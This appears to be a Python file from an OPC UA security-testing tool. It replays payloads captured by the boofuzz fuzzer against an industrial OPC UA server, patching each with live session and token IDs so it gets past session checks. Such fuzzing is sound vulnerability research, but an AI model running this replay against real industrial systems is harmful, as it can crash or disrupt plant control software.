import datetime
import sqlite3

from protocol import *
from config import *

def get_list_of_payloads(db_file_name, number_of_payloads):
    result_list = []
    conn = sqlite3.connect(db_file_name)
    cursor = conn.execute("SELECT test_case_index FROM steps ORDER BY test_case_index DESC LIMIT 1")
    test_case_max_num = list(cursor)[0][0]
    print("[-] Found {test_case_max_num} test cases".format(test_case_max_num=test_case_max_num))
    for test_case in range(1, test_case_max_num):
        cursor = conn.execute("SELECT data FROM steps WHERE test_case_index = {} AND type = 'send'".format(test_case))
        bd_list = list(cursor)
        try:
            # 4 --> Payload (0 - data)
            if len(bd_list) >= 5:
                result_list.append(bd_list[4][0]) # 0 - HEL, 1 - OPN, 2 - MSG, 3 - MSG, 4 - PAYLOAD
            else:
                print("Warning: Failed adding test case {}, number of messages in test {} (should be at least 5)".format(test_case, len(bd_list)))
        except Exception as e:
            print("[X] Failed adding test case {}, number of messages in test {}".format(test_case, len(bd_list)))
    return result_list


def send_message_from_payload(server_details, payload):
    program_type, ip_addr, port, query_string = server_details

    opcua = OPCUA(program_type=program_type, ip_addr=ip_addr, port=port, query_string=query_string)
    opcua.create_session()

    # Prepare message
    payload = bytearray(payload)
    payload[8:12] = struct.pack("<I", opcua.secure_channel_id)   # Security Channel ID
    payload[12:16] = struct.pack("<I", opcua.secure_token_id)   # Security Token ID (Only ignition checks it)
    payload[28:len(OBJECT.build(opcua.auth_id))] = OBJECT.build(opcua.auth_id)

    print("[-] Sending OPCUA payload with len {} bytes".format(len(payload)))
    opcua.send_recv(payload, 1, should_recv=False)
    time.sleep(0.01)

    # Close connection
    print("[-] Closing connection")
    try:
        opcua.close()
    except Exception as e:
        print(e)

#BooFuzz - shot all packets captured by boofuzz network fuzzer
def attack_boofuzz_payload(server_details, db_file_path):
    corpus_list = get_list_of_payloads(db_file_path, 1000)
    for i, payload in enumerate(corpus_list):
        print("--------------------")
        print("[-] Payload {} of {} total files".format(i + 1, len(corpus_list)))
        send_message_from_payload(server_details, payload)
